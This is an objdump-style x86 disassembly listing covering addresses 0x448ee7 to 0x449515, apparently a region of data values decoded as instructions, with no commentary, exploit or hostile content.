  448ee7:	add    BYTE PTR [eax],al
  448ee9:	cmp    edi,edi
  448eeb:	add    BYTE PTR [eax],al
  448eed:	inc    eax
  448eee:	inc    DWORD PTR [eax]
  448ef0:	add    BYTE PTR [edx-0x1],al
  448ef3:	add    BYTE PTR [eax],al
  448ef5:	inc    DWORD PTR ds:[eax]
  448ef8:	add    BYTE PTR [ebp-0x1],cl
  448efb:	add    BYTE PTR [eax],al
  448efd:	dec    edx
  448efe:	inc    DWORD PTR [eax]
  448f00:	add    BYTE PTR [esi-0x1],dl
  448f03:	add    BYTE PTR [eax],al
  448f05:	push   ecx
  448f06:	inc    DWORD PTR [eax]
  448f08:	add    BYTE PTR [ecx-0x1],cl
  448f0b:	add    BYTE PTR [eax],al
  448f0d:	dec    ecx
  448f0e:	inc    DWORD PTR [eax]
  448f10:	add    BYTE PTR [edx-0x1],cl
  448f13:	add    BYTE PTR [eax],al
  448f15:	dec    ebp
  448f16:	inc    DWORD PTR [eax]
  448f18:	add    BYTE PTR [eax-0x1],al
  448f1b:	add    BYTE PTR [eax],al
  448f1d:	inc    ebx
  448f1e:	inc    DWORD PTR [eax]
  448f20:	add    BYTE PTR [edi+edi*8+0x0],al
  448f24:	add    BYTE PTR [ebx-0x1],al
  448f27:	add    BYTE PTR [eax],al
  448f29:	inc    ebp
  448f2a:	inc    DWORD PTR [eax]
  448f2c:	add    BYTE PTR [edx-0x1],al
  448f2f:	add    BYTE PTR [eax],al
  448f31:	inc    ecx
  448f32:	inc    DWORD PTR [eax]
  448f34:	add    BYTE PTR [edi],bh
  448f36:	inc    DWORD PTR [eax]
  448f38:	add    BYTE PTR [edi+edi*8],bh
  448f3b:	add    BYTE PTR [eax],al
  448f3d:	inc    eax
  448f3e:	inc    DWORD PTR [eax]
  448f40:	add    BYTE PTR [edi+edi*8],bh
  448f43:	add    BYTE PTR [eax],al
  448f45:	cmp    bh,bh
  448f47:	add    BYTE PTR [eax],al
  448f49:	aaa    
  448f4a:	inc    DWORD PTR [eax]
  448f4c:	add    BYTE PTR [eax],bh
  448f4e:	inc    DWORD PTR [eax]
  448f50:	add    BYTE PTR [edi],dh
  448f52:	inc    DWORD PTR [eax]
  448f54:	add    BYTE PTR [eax],bh
  448f56:	inc    DWORD PTR [eax]
  448f58:	add    BYTE PTR [eax],bh
  448f5a:	inc    DWORD PTR [eax]
  448f5c:	add    BYTE PTR ds:0x380000ff,dh
  448f62:	inc    DWORD PTR [eax]
  448f64:	add    BYTE PTR [ebx],bh
  448f66:	inc    DWORD PTR [eax]
  448f68:	add    BYTE PTR [edi],ch
  448f6a:	jmp    DWORD PTR ds:0xbf3525
  448f70:	add    BYTE PTR [edx],ah
  448f72:	inc    DWORD PTR [eax]
  448f74:	add    BYTE PTR [eax],ch
  448f76:	inc    DWORD PTR [eax]
  448f78:	add    BYTE PTR ds:0x2f0000ff,ch
  448f7e:	inc    DWORD PTR [eax]
  448f80:	add    BYTE PTR [ebx],dh
  448f82:	inc    DWORD PTR [eax]
  448f84:	add    BYTE PTR [ecx],bh
  448f86:	inc    DWORD PTR [eax]
  448f88:	add    BYTE PTR [edi],ch
  448f8a:	inc    DWORD PTR [eax]
  448f8c:	add    BYTE PTR [eax],ch
  448f8e:	inc    DWORD PTR [eax]
  448f90:	add    BYTE PTR [ebx],ch
  448f92:	inc    DWORD PTR [eax]
  448f94:	add    BYTE PTR [ecx],dh
  448f96:	inc    DWORD PTR [eax]
  448f98:	add    BYTE PTR ds:0x2d0000ff,ch
  448f9e:	inc    DWORD PTR [eax]
  448fa0:	add    BYTE PTR [ecx],dh
  448fa2:	inc    DWORD PTR [eax]
  448fa4:	add    BYTE PTR [edi],dh
  448fa6:	inc    DWORD PTR [eax]
  448fa8:	add    BYTE PTR [edi+edi*8],dh
  448fab:	add    BYTE PTR [eax],al
  448fad:	inc    DWORD PTR ss:[eax]
  448fb0:	add    BYTE PTR [eax],bh
  448fb2:	inc    DWORD PTR [eax]
  448fb4:	add    BYTE PTR [eax],bh
  448fb6:	inc    DWORD PTR [eax]
  448fb8:	add    BYTE PTR ds:0x3c0000ff,dh
  448fbe:	inc    DWORD PTR [eax]
  448fc0:	add    BYTE PTR [edi],dh
  448fc2:	inc    DWORD PTR [eax]
  448fc4:	add    BYTE PTR [esi],bh
  448fc6:	inc    DWORD PTR [eax]
  448fc8:	add    BYTE PTR [edi+edi*8+0x0],al
  448fcc:	add    BYTE PTR [edx-0x1],al
  448fcf:	add    BYTE PTR [eax],al
  448fd1:	cmp    edi,edi
  448fd3:	add    BYTE PTR [eax],al
  448fd5:	aas    
  448fd6:	inc    DWORD PTR [eax]
  448fd8:	add    BYTE PTR [edi-0x1],al
  448fdb:	add    BYTE PTR [eax],al
  448fdd:	inc    esp
  448fde:	inc    DWORD PTR [eax]
  448fe0:	add    BYTE PTR [eax-0x1],cl
  448fe3:	add    BYTE PTR [eax],al
  448fe5:	inc    edx
  448fe6:	inc    DWORD PTR [eax]
  448fe8:	add    BYTE PTR [edi-0x1],al
  448feb:	add    BYTE PTR [eax],al
  448fed:	push   edx
  448fee:	inc    DWORD PTR [eax]
  448ff0:	add    BYTE PTR [edi+edi*8+0x0],cl
  448ff4:	add    BYTE PTR [esi-0x1],al
  448ff7:	add    BYTE PTR [eax],al
  448ff9:	dec    ecx
  448ffa:	inc    DWORD PTR [eax]
  448ffc:	add    BYTE PTR [ebx-0x1],cl
  448fff:	add    BYTE PTR [eax],al
  449001:	push   ecx
  449002:	inc    DWORD PTR [eax]
  449004:	add    BYTE PTR [edi-0x1],cl
  449007:	add    BYTE PTR [eax],al
  449009:	dec    eax
  44900a:	inc    DWORD PTR [eax]
  44900c:	add    BYTE PTR [edi+edi*8+0x0],al
  449010:	add    BYTE PTR [edx],bh
  449012:	inc    DWORD PTR [eax]
  449014:	add    BYTE PTR [edi+edi*8+0x0],al
  449018:	add    BYTE PTR [esi-0x1],al
  44901b:	add    BYTE PTR [eax],al
  44901d:	dec    ecx
  44901e:	inc    DWORD PTR [eax]
  449020:	add    BYTE PTR [ecx-0x1],al
  449023:	add    BYTE PTR [eax],al
  449025:	inc    ecx
  449026:	inc    DWORD PTR [eax]
  449028:	add    BYTE PTR [edi+edi*8],bh
  44902b:	add    BYTE PTR [eax],al
  44902d:	inc    eax
  44902e:	inc    DWORD PTR [eax]
  449030:	add    BYTE PTR [edi],bh
  449032:	inc    DWORD PTR [eax]
  449034:	add    BYTE PTR [edi+edi*8],bh
  449037:	add    BYTE PTR [eax],al
  449039:	cmp    eax,0x400000ff
  44903e:	inc    DWORD PTR [eax]
  449040:	add    BYTE PTR [ecx-0x1],al
  449043:	add    BYTE PTR [eax],al
  449045:	xor    eax,0x3a0000ff
  44904a:	inc    DWORD PTR [eax]
  44904c:	add    BYTE PTR [edx],bh
  44904e:	inc    DWORD PTR [eax]
  449050:	add    BYTE PTR [edi+edi*8],dh
  449053:	add    BYTE PTR [eax],al
  449055:	xor    al,0xff
  449057:	add    BYTE PTR [eax],al
  449059:	xor    al,0xff
  44905b:	add    BYTE PTR [eax],al
  44905d:	xor    eax,0x370000ff
  449062:	inc    DWORD PTR [eax]
  449064:	add    BYTE PTR [ebx],dh
  449066:	inc    DWORD PTR [eax]
  449068:	add    BYTE PTR [edx],dh
  44906a:	dec    DWORD PTR [esi]
  44906c:	or     eax,0xf729
  449071:	sbb    bh,bh
  449073:	add    BYTE PTR [eax],al
  449075:	and    edi,edi
  449077:	add    BYTE PTR [eax],al
  449079:	sub    bh,bh
  44907b:	add    BYTE PTR [eax],al
  44907d:	and    edi,edi
  44907f:	add    BYTE PTR [eax],al
  449081:	sub    bh,bh
  449083:	add    BYTE PTR [eax],al
  449085:	sub    bh,bh
  449087:	add    BYTE PTR [eax],al
  449089:	inc    DWORD PTR cs:[eax]
  44908c:	add    BYTE PTR ds:0x330000ff,dh
  449092:	inc    DWORD PTR [eax]
  449094:	add    BYTE PTR [edx],dh
  449096:	inc    DWORD PTR [eax]
  449098:	add    BYTE PTR [edi],dh
  44909a:	inc    DWORD PTR [eax]
  44909c:	add    BYTE PTR [edi],dh
  44909e:	inc    DWORD PTR [eax]
  4490a0:	add    BYTE PTR [edi],ch
  4490a2:	inc    DWORD PTR [eax]
  4490a4:	add    BYTE PTR [edx],dh
  4490a6:	inc    DWORD PTR [eax]
  4490a8:	add    BYTE PTR [ecx],bh
  4490aa:	inc    DWORD PTR [eax]
  4490ac:	add    BYTE PTR [ebx],dh
  4490ae:	inc    DWORD PTR [eax]
  4490b0:	add    BYTE PTR [edi],ch
  4490b2:	inc    DWORD PTR [eax]
  4490b4:	add    BYTE PTR [esi],dh
  4490b6:	inc    DWORD PTR [eax]
  4490b8:	add    BYTE PTR [ebx],dh
  4490ba:	inc    DWORD PTR [eax]
  4490bc:	add    BYTE PTR [edi],dh
  4490be:	inc    DWORD PTR [eax]
  4490c0:	add    BYTE PTR [ebx],bh
  4490c2:	inc    DWORD PTR [eax]
  4490c4:	add    BYTE PTR [edx],dh
  4490c6:	inc    DWORD PTR [eax]
  4490c8:	add    BYTE PTR [eax],bh
  4490ca:	inc    DWORD PTR [eax]
  4490cc:	add    BYTE PTR [ebx-0x1],al
  4490cf:	add    BYTE PTR [eax],al
  4490d1:	inc    esp
  4490d2:	inc    DWORD PTR [eax]
  4490d4:	add    BYTE PTR [esi],bh
  4490d6:	inc    DWORD PTR [eax]
  4490d8:	add    BYTE PTR [eax],bh
  4490da:	inc    DWORD PTR [eax]
  4490dc:	add    BYTE PTR [edi+edi*8+0x0],al
  4490e0:	add    BYTE PTR [ebp-0x1],al
  4490e3:	add    BYTE PTR [eax],al
  4490e5:	dec    esi
  4490e6:	inc    DWORD PTR [eax]
  4490e8:	add    BYTE PTR [esi-0x1],al
  4490eb:	add    BYTE PTR [eax],al
  4490ed:	inc    esi
  4490ee:	inc    DWORD PTR [eax]
  4490f0:	add    BYTE PTR [ecx-0x1],cl
  4490f3:	add    BYTE PTR [eax],al
  4490f5:	dec    esp
  4490f6:	inc    DWORD PTR [eax]
  4490f8:	add    BYTE PTR [eax-0x1],cl
  4490fb:	add    BYTE PTR [eax],al
  4490fd:	dec    esi
  4490fe:	inc    DWORD PTR [eax]
  449100:	add    BYTE PTR [esi-0x1],cl
  449103:	add    BYTE PTR [eax],al
  449105:	push   ebp
  449106:	inc    DWORD PTR [eax]
  449108:	add    BYTE PTR [edi-0x1],al
  44910b:	add    BYTE PTR [eax],al
  44910d:	inc    esp
  44910e:	inc    DWORD PTR [eax]
  449110:	add    BYTE PTR [ebx],bh
  449112:	inc    DWORD PTR [eax]
  449114:	add    BYTE PTR [edi-0x1],al
  449117:	add    BYTE PTR [eax],al
  449119:	inc    esp
  44911a:	inc    DWORD PTR [eax]
  44911c:	add    BYTE PTR [esi],bh
  44911e:	inc    DWORD PTR [eax]
  449120:	add    BYTE PTR [edi],bh
  449122:	inc    DWORD PTR [eax]
  449124:	add    BYTE PTR [edi],bh
  449126:	inc    DWORD PTR [eax]
  449128:	add    BYTE PTR [ebx-0x1],al
  44912b:	add    BYTE PTR [eax],al
  44912d:	aas    
  44912e:	inc    DWORD PTR [eax]
  449130:	add    BYTE PTR [edi],dh
  449132:	inc    DWORD PTR [eax]
  449134:	add    BYTE PTR [ecx],bh
  449136:	inc    DWORD PTR [eax]
  449138:	add    BYTE PTR [edx],bh
  44913a:	inc    DWORD PTR [eax]
  44913c:	add    BYTE PTR [edi],dh
  44913e:	inc    DWORD PTR [eax]
  449140:	add    BYTE PTR [edx],bh
  449142:	inc    DWORD PTR [eax]
  449144:	add    BYTE PTR [edi],dh
  449146:	inc    DWORD PTR [eax]
  449148:	add    BYTE PTR [esi],dh
  44914a:	inc    DWORD PTR [eax]
  44914c:	add    BYTE PTR ds:0x340000ff,dh
  449152:	inc    DWORD PTR [eax]
  449154:	add    BYTE PTR [edx],dh
  449156:	inc    DWORD PTR [eax]
  449158:	add    BYTE PTR [ecx],dh
  44915a:	inc    DWORD PTR [eax]
  44915c:	add    BYTE PTR [eax],bh
  44915e:	inc    DWORD PTR [eax]
  449160:	add    BYTE PTR ds:0x300000ff,dh
  449166:	inc    DWORD PTR [eax]
  449168:	add    BYTE PTR [esi],ch
  44916a:	inc    DWORD PTR [edx]
  44916c:	add    ah,BYTE PTR [esi+edi*8]
  44916f:	add    BYTE PTR [eax],al
  449171:	sbb    bh,bh
  449173:	add    BYTE PTR [eax],al
  449175:	and    edi,edi
  449177:	add    BYTE PTR [eax],al
  449179:	inc    DWORD PTR es:[eax]
  44917c:	add    BYTE PTR [ecx],ch
  44917e:	inc    DWORD PTR [eax]
  449180:	add    BYTE PTR [edi+edi*8],ah
  449183:	add    BYTE PTR [eax],al
  449185:	inc    DWORD PTR es:[eax]
  449188:	add    BYTE PTR [ebx],ah
  44918a:	inc    DWORD PTR [eax]
  44918c:	add    BYTE PTR [ecx],ch
  44918e:	inc    DWORD PTR [eax]
  449190:	add    BYTE PTR [edi],ch
  449192:	inc    DWORD PTR [eax]
  449194:	add    BYTE PTR [edi+edi*8],dh
  449197:	add    BYTE PTR [eax],al
  449199:	xor    edi,edi
  44919b:	add    BYTE PTR [eax],al
  44919d:	xor    al,0xff
  44919f:	add    BYTE PTR [eax],al
  4491a1:	cmp    edi,edi
  4491a3:	add    BYTE PTR [eax],al
  4491a5:	cmp    bh,bh
  4491a7:	add    BYTE PTR [eax],al
  4491a9:	cmp    bh,bh
  4491ab:	add    BYTE PTR [eax],al
  4491ad:	xor    edi,edi
  4491af:	add    BYTE PTR [eax],al
  4491b1:	cmp    bh,bh
  4491b3:	add    BYTE PTR [eax],al
  4491b5:	xor    eax,0x3c0000ff
  4491ba:	inc    DWORD PTR [eax]
  4491bc:	add    BYTE PTR [eax],bh
  4491be:	inc    DWORD PTR [eax]
  4491c0:	add    BYTE PTR [eax],dh
  4491c2:	inc    DWORD PTR [eax]
  4491c4:	add    BYTE PTR [eax],bh
  4491c6:	inc    DWORD PTR [eax]
  4491c8:	add    BYTE PTR ds:0x430000ff,bh
  4491ce:	inc    DWORD PTR [eax]
  4491d0:	add    BYTE PTR [ecx],bh
  4491d2:	inc    DWORD PTR [eax]
  4491d4:	add    BYTE PTR ds:0x3d0000ff,dh
  4491da:	inc    DWORD PTR [eax]
  4491dc:	add    BYTE PTR [ebx],bh
  4491de:	inc    DWORD PTR [eax]
  4491e0:	add    BYTE PTR [edi+edi*8],bh
  4491e3:	add    BYTE PTR [eax],al
  4491e5:	inc    ebx
  4491e6:	inc    DWORD PTR [eax]
  4491e8:	add    BYTE PTR [edi+edi*8+0x0],cl
  4491ec:	add    BYTE PTR [ebx-0x1],cl
  4491ef:	add    BYTE PTR [eax],al
  4491f1:	dec    ecx
  4491f2:	inc    DWORD PTR [eax]
  4491f4:	add    BYTE PTR [ebx-0x1],cl
  4491f7:	add    BYTE PTR [eax],al
  4491f9:	push   ebx
  4491fa:	inc    DWORD PTR [eax]
  4491fc:	add    BYTE PTR [eax-0x1],dl
  4491ff:	add    BYTE PTR [eax],al
  449201:	dec    esi
  449202:	inc    DWORD PTR [eax]
  449204:	add    BYTE PTR [esi-0x1],cl
  449207:	add    BYTE PTR [eax],al
  449209:	dec    eax
  44920a:	inc    DWORD PTR [eax]
  44920c:	add    BYTE PTR [esi-0x1],al
  44920f:	add    BYTE PTR [eax],al
  449211:	cmp    al,0xff
  449213:	add    BYTE PTR [eax],al
  449215:	inc    eax
  449216:	inc    DWORD PTR [eax]
  449218:	add    BYTE PTR [ebx-0x1],al
  44921b:	add    BYTE PTR [eax],al
  44921d:	inc    eax
  44921e:	inc    DWORD PTR [eax]
  449220:	add    BYTE PTR ds:0x450000ff,bh
  449226:	inc    DWORD PTR [eax]
  449228:	add    BYTE PTR [ebx-0x1],al
  44922b:	add    BYTE PTR [eax],al
  44922d:	inc    ebp
  44922e:	inc    DWORD PTR [eax]
  449230:	add    BYTE PTR [edx],bh
  449232:	inc    DWORD PTR [eax]
  449234:	add    BYTE PTR [edx],bh
  449236:	inc    DWORD PTR [eax]
  449238:	add    BYTE PTR [esi],dh
  44923a:	inc    DWORD PTR [eax]
  44923c:	add    BYTE PTR [edx],bh
  44923e:	inc    DWORD PTR [eax]
  449240:	add    BYTE PTR [esi],bh
  449242:	inc    DWORD PTR [eax]
  449244:	add    BYTE PTR [edi],dh
  449246:	inc    DWORD PTR [eax]
  449248:	add    BYTE PTR [edi+edi*8],dh
  44924b:	add    BYTE PTR [eax],al
  44924d:	xor    edi,edi
  44924f:	add    BYTE PTR [eax],al
  449251:	xor    edi,edi
  449253:	add    BYTE PTR [eax],al
  449255:	xor    bh,bh
  449257:	add    BYTE PTR [eax],al
  449259:	xor    edi,edi
  44925b:	add    BYTE PTR [eax],al
  44925d:	xor    bh,bh
  44925f:	add    BYTE PTR [eax],al
  449261:	xor    bh,bh
  449263:	add    BYTE PTR [eax],al
  449265:	xor    edi,edi
  449267:	add    BYTE PTR [eax],al
  449269:	xor    eax,0x2a0000ff
  44926e:	inc    DWORD PTR [eax]
  449270:	add    BYTE PTR ds:0x220000ff,bl
  449276:	inc    DWORD PTR [eax]
  449278:	add    BYTE PTR [esi],bl
  44927a:	inc    DWORD PTR [eax]
  44927c:	add    BYTE PTR [ebx],ah
  44927e:	inc    DWORD PTR [eax]
  449280:	add    BYTE PTR [ecx],ch
  449282:	inc    DWORD PTR [eax]
  449284:	add    BYTE PTR [edi],ah
  449286:	inc    DWORD PTR [eax]
  449288:	add    BYTE PTR [eax],ch
  44928a:	inc    DWORD PTR [eax]
  44928c:	add    BYTE PTR ds:0x230000ff,ah
  449292:	inc    DWORD PTR [eax]
  449294:	add    BYTE PTR [ebx],ch
  449296:	inc    DWORD PTR [eax]
  449298:	add    BYTE PTR [eax],dh
  44929a:	inc    DWORD PTR [eax]
  44929c:	add    BYTE PTR ds:0x2f0000ff,ch
  4492a2:	inc    DWORD PTR [eax]
  4492a4:	add    BYTE PTR ds:0x2f0000ff,ch
  4492aa:	inc    DWORD PTR [eax]
  4492ac:	add    BYTE PTR ds:0x350000ff,ch
  4492b2:	inc    DWORD PTR [eax]
  4492b4:	add    BYTE PTR ds:0x3d0000ff,dh
  4492ba:	inc    DWORD PTR [eax]
  4492bc:	add    BYTE PTR [edi],bh
  4492be:	inc    DWORD PTR [eax]
  4492c0:	add    BYTE PTR [edi+edi*8],dh
  4492c3:	add    BYTE PTR [eax],al
  4492c5:	cmp    bh,bh
  4492c7:	add    BYTE PTR [eax],al
  4492c9:	cmp    bh,bh
  4492cb:	add    BYTE PTR [eax],al
  4492cd:	inc    DWORD PTR ds:[eax]
  4492d0:	add    BYTE PTR [edi],bh
  4492d2:	inc    DWORD PTR [eax]
  4492d4:	add    BYTE PTR [edi],dh
  4492d6:	inc    DWORD PTR [eax]
  4492d8:	add    BYTE PTR [edi+edi*8],bh
  4492db:	add    BYTE PTR [eax],al
  4492dd:	inc    edi
  4492de:	inc    DWORD PTR [eax]
  4492e0:	add    BYTE PTR [edi+edi*8+0x0],al
  4492e4:	add    BYTE PTR [esi-0x1],al
  4492e7:	add    BYTE PTR [eax],al
  4492e9:	inc    edi
  4492ea:	inc    DWORD PTR [eax]
  4492ec:	add    BYTE PTR [edi+edi*8+0x0],cl
  4492f0:	add    BYTE PTR [ebp-0x1],cl
  4492f3:	add    BYTE PTR [eax],al
  4492f5:	dec    edi
  4492f6:	inc    DWORD PTR [eax]
  4492f8:	add    BYTE PTR [edi-0x1],dl
  4492fb:	add    BYTE PTR [eax],al
  4492fd:	dec    esi
  4492fe:	inc    DWORD PTR [eax]
  449300:	add    BYTE PTR [edx-0x1],dl
  449303:	add    BYTE PTR [eax],al
  449305:	push   ecx
  449306:	inc    DWORD PTR [eax]
  449308:	add    BYTE PTR [ecx-0x1],cl
  44930b:	add    BYTE PTR [eax],al
  44930d:	inc    edi
  44930e:	inc    DWORD PTR [eax]
  449310:	add    BYTE PTR [ebx-0x1],al
  449313:	add    BYTE PTR [eax],al
  449315:	inc    esi
  449316:	inc    DWORD PTR [eax]
  449318:	add    BYTE PTR [edi-0x1],al
  44931b:	add    BYTE PTR [eax],al
  44931d:	inc    esi
  44931e:	inc    DWORD PTR [eax]
  449320:	add    BYTE PTR [edi+edi*8],bh
  449323:	add    BYTE PTR [eax],al
  449325:	cmp    edi,edi
  449327:	add    BYTE PTR [eax],al
  449329:	aas    
  44932a:	inc    DWORD PTR [eax]
  44932c:	add    BYTE PTR [ebx],bh
  44932e:	inc    DWORD PTR [eax]
  449330:	add    BYTE PTR [edi+edi*8],bh
  449333:	add    BYTE PTR [eax],al
  449335:	inc    eax
  449336:	inc    DWORD PTR [eax]
  449338:	add    BYTE PTR [eax],bh
  44933a:	inc    DWORD PTR [eax]
  44933c:	add    BYTE PTR [edi+edi*8],dh
  44933f:	add    BYTE PTR [eax],al
  449341:	xor    eax,0x300000ff
  449346:	inc    DWORD PTR [eax]
  449348:	add    BYTE PTR [eax],dh
  44934a:	inc    DWORD PTR [eax]
  44934c:	add    BYTE PTR [eax],dh
  44934e:	inc    DWORD PTR [eax]
  449350:	add    BYTE PTR [ebx],ch
  449352:	inc    DWORD PTR [eax]
  449354:	add    BYTE PTR [edi+edi*8],dh
  449357:	add    BYTE PTR [eax],al
  449359:	inc    DWORD PTR ss:[eax]
  44935c:	add    BYTE PTR [edi],ch
  44935e:	inc    DWORD PTR [eax]
  449360:	add    BYTE PTR [edi],ch
  449362:	inc    DWORD PTR [eax]
  449364:	add    BYTE PTR [edx],ch
  449366:	inc    DWORD PTR [eax]
  449368:	add    BYTE PTR [edi],ch
  44936a:	inc    DWORD PTR [eax]
  44936c:	add    BYTE PTR [esi],ah
  44936e:	inc    DWORD PTR [eax]
  449370:	add    BYTE PTR [esi],bl
  449372:	inc    DWORD PTR [eax]
  449374:	add    BYTE PTR [ebx],ah
  449376:	inc    DWORD PTR [eax]
  449378:	add    BYTE PTR [eax],ch
  44937a:	inc    DWORD PTR [eax]
  44937c:	add    BYTE PTR [esi],ah
  44937e:	inc    DWORD PTR [eax]
  449380:	add    BYTE PTR [ebx],ch
  449382:	inc    DWORD PTR [eax]
  449384:	add    BYTE PTR ds:0x2a0000ff,ch
  44938a:	inc    DWORD PTR [eax]
  44938c:	add    BYTE PTR [ecx],ch
  44938e:	inc    DWORD PTR [eax]
  449390:	add    BYTE PTR ds:0x290000ff,ch
  449396:	inc    DWORD PTR [eax]
  449398:	add    BYTE PTR [edi],ch
  44939a:	inc    DWORD PTR [eax]
  44939c:	add    BYTE PTR [edi+edi*8],dh
  44939f:	add    BYTE PTR [eax],al
  4493a1:	aaa    
  4493a2:	inc    DWORD PTR [eax]
  4493a4:	add    BYTE PTR [edi+edi*8],dh
  4493a7:	add    BYTE PTR [eax],al
  4493a9:	xor    al,0xff
  4493ab:	add    BYTE PTR [eax],al
  4493ad:	das    
  4493ae:	inc    DWORD PTR [eax]
  4493b0:	add    BYTE PTR [ecx],dh
  4493b2:	inc    DWORD PTR [eax]
  4493b4:	add    BYTE PTR [esi],ch
  4493b6:	inc    DWORD PTR [eax]
  4493b8:	add    BYTE PTR [edx],ch
  4493ba:	inc    DWORD PTR [eax]
  4493bc:	add    BYTE PTR [ebx],ch
  4493be:	inc    DWORD PTR [eax]
  4493c0:	add    BYTE PTR [esi],dh
  4493c2:	inc    DWORD PTR [eax]
  4493c4:	add    BYTE PTR ds:0x370000ff,bh
  4493ca:	inc    DWORD PTR [eax]
  4493cc:	add    BYTE PTR [edi],dh
  4493ce:	inc    DWORD PTR [eax]
  4493d0:	add    BYTE PTR [ecx],bh
  4493d2:	inc    DWORD PTR [eax]
  4493d4:	add    BYTE PTR [ecx],bh
  4493d6:	inc    DWORD PTR [eax]
  4493d8:	add    BYTE PTR ds:0x4a0000ff,bh
  4493de:	inc    DWORD PTR [eax]
  4493e0:	add    BYTE PTR [edx-0x1],al
  4493e3:	add    BYTE PTR [eax],al
  4493e5:	inc    edi
  4493e6:	inc    DWORD PTR [eax]
  4493e8:	add    BYTE PTR [edx-0x1],dl
  4493eb:	add    BYTE PTR [eax],al
  4493ed:	dec    esi
  4493ee:	inc    DWORD PTR [eax]
  4493f0:	add    BYTE PTR [eax-0x1],al
  4493f3:	add    BYTE PTR [eax],al
  4493f5:	dec    esi
  4493f6:	inc    DWORD PTR [eax]
  4493f8:	add    BYTE PTR [ebx-0x1],dl
  4493fb:	add    BYTE PTR [eax],al
  4493fd:	dec    ecx
  4493fe:	inc    DWORD PTR [eax]
  449400:	add    BYTE PTR [edx-0x1],cl
  449403:	add    BYTE PTR [eax],al
  449405:	dec    ecx
  449406:	inc    DWORD PTR [eax]
  449408:	add    BYTE PTR [ebp-0x1],al
  44940b:	add    BYTE PTR [eax],al
  44940d:	dec    eax
  44940e:	inc    DWORD PTR [eax]
  449410:	add    BYTE PTR [eax-0x1],cl
  449413:	add    BYTE PTR [eax],al
  449415:	inc    esp
  449416:	inc    DWORD PTR [eax]
  449418:	add    BYTE PTR ds:0x3c0000ff,bh
  44941e:	inc    DWORD PTR [eax]
  449420:	add    BYTE PTR [ecx-0x1],al
  449423:	add    BYTE PTR [eax],al
  449425:	inc    eax
  449426:	inc    DWORD PTR [eax]
  449428:	add    BYTE PTR [eax-0x1],al
  44942b:	add    BYTE PTR [eax],al
  44942d:	inc    edx
  44942e:	inc    DWORD PTR [eax]
  449430:	add    BYTE PTR [edi],bh
  449432:	inc    DWORD PTR [eax]
  449434:	add    BYTE PTR [eax-0x1],al
  449437:	add    BYTE PTR [eax],al
  449439:	cmp    edi,edi
  44943b:	add    BYTE PTR [eax],al
  44943d:	xor    eax,0x310000ff
  449442:	inc    DWORD PTR [eax]
  449444:	add    BYTE PTR [ebx],ch
  449446:	inc    DWORD PTR [eax]
  449448:	add    BYTE PTR [edx],dh
  44944a:	inc    DWORD PTR [eax]
  44944c:	add    BYTE PTR [esi],dh
  44944e:	inc    DWORD PTR [eax]
  449450:	add    BYTE PTR [edi+edi*8],ch
  449453:	add    BYTE PTR [eax],al
  449455:	xor    edi,edi
  449457:	add    BYTE PTR [eax],al
  449459:	xor    bh,bh
  44945b:	add    BYTE PTR [eax],al
  44945d:	xor    edi,edi
  44945f:	add    BYTE PTR [eax],al
  449461:	sub    al,0xff
  449463:	add    BYTE PTR [eax],al
  449465:	sub    al,0xff
  449467:	add    BYTE PTR [eax],al
  449469:	sub    bh,bh
  44946b:	add    BYTE PTR [eax],al
  44946d:	and    bh,bh
  44946f:	add    BYTE PTR [eax],al
  449471:	pop    ds
  449472:	inc    DWORD PTR [eax]
  449474:	add    BYTE PTR [eax],ah
  449476:	inc    DWORD PTR [eax]
  449478:	add    BYTE PTR ds:0x2b0000ff,ah
  44947e:	inc    DWORD PTR [eax]
  449480:	add    BYTE PTR [ecx],ch
  449482:	inc    DWORD PTR [eax]
  449484:	add    BYTE PTR [ecx],ch
  449486:	inc    DWORD PTR [eax]
  449488:	add    BYTE PTR [edi+edi*8],ch
  44948b:	add    BYTE PTR [eax],al
  44948d:	xor    bh,bh
  44948f:	add    BYTE PTR [eax],al
  449491:	aaa    
  449492:	inc    DWORD PTR [eax]
  449494:	add    BYTE PTR [ebx],dh
  449496:	inc    DWORD PTR [eax]
  449498:	add    BYTE PTR [eax],dh
  44949a:	inc    DWORD PTR [eax]
  44949c:	add    BYTE PTR [ecx],ch
  44949e:	inc    DWORD PTR [eax]
  4494a0:	add    BYTE PTR [eax],dh
  4494a2:	inc    DWORD PTR [eax]
  4494a4:	add    BYTE PTR [ebx],bh
  4494a6:	inc    DWORD PTR [eax]
  4494a8:	add    BYTE PTR [eax],bh
  4494aa:	inc    DWORD PTR [eax]
  4494ac:	add    BYTE PTR [ebx],dh
  4494ae:	inc    DWORD PTR [eax]
  4494b0:	add    BYTE PTR [esi],ch
  4494b2:	inc    DWORD PTR [eax]
  4494b4:	add    BYTE PTR [esi],ch
  4494b6:	inc    DWORD PTR [eax]
  4494b8:	add    BYTE PTR [ecx],ch
  4494ba:	inc    DWORD PTR [eax]
  4494bc:	add    BYTE PTR [ecx],dh
  4494be:	inc    DWORD PTR [eax]
  4494c0:	add    BYTE PTR [ebx],bh
  4494c2:	inc    DWORD PTR [eax]
  4494c4:	add    BYTE PTR [edi],bh
  4494c6:	inc    DWORD PTR [eax]
  4494c8:	add    BYTE PTR ds:0x380000ff,bh
  4494ce:	inc    DWORD PTR [eax]
  4494d0:	add    BYTE PTR [edi],dh
  4494d2:	inc    DWORD PTR [eax]
  4494d4:	add    BYTE PTR [edi-0x1],al
  4494d7:	add    BYTE PTR [eax],al
  4494d9:	inc    eax
  4494da:	inc    DWORD PTR [eax]
  4494dc:	add    BYTE PTR [ebx-0x1],al
  4494df:	add    BYTE PTR [eax],al
  4494e1:	inc    ebx
  4494e2:	inc    DWORD PTR [eax]
  4494e4:	add    BYTE PTR [esi-0x1],al
  4494e7:	add    BYTE PTR [eax],al
  4494e9:	inc    eax
  4494ea:	inc    DWORD PTR [eax]
  4494ec:	add    BYTE PTR [edi+edi*8+0x0],al
  4494f0:	add    BYTE PTR [ecx],bh
  4494f2:	inc    DWORD PTR [eax]
  4494f4:	add    BYTE PTR [ebp-0x1],al
  4494f7:	add    BYTE PTR [eax],al
  4494f9:	inc    eax
  4494fa:	inc    DWORD PTR [eax]
  4494fc:	add    BYTE PTR [eax-0x1],al
  4494ff:	add    BYTE PTR [eax],al
  449501:	push   ebx
  449502:	inc    DWORD PTR [eax]
  449504:	add    BYTE PTR [eax-0x1],dl
  449507:	add    BYTE PTR [eax],al
  449509:	inc    edx
  44950a:	inc    DWORD PTR [eax]
  44950c:	add    BYTE PTR [edi+edi*8+0x0],al
  449510:	add    BYTE PTR [ebx-0x1],al
  449513:	add    BYTE PTR [eax],al
  449515:	inc    ebx
